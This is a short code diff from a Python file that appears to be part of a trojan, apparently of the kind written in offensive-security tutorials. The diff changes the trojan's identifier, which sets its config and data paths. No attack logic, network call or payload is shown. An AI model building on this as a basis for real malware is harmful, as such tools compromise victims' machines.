@@ -9,7 +9,7 @@ import queue
 import os
 import requests
 
-trojan_id = 'config'
+trojan_id = 'test'
 
 trojan_config = 'config/{}.json'.format(trojan_id)
 data_path = "data/{}".format(trojan_id)
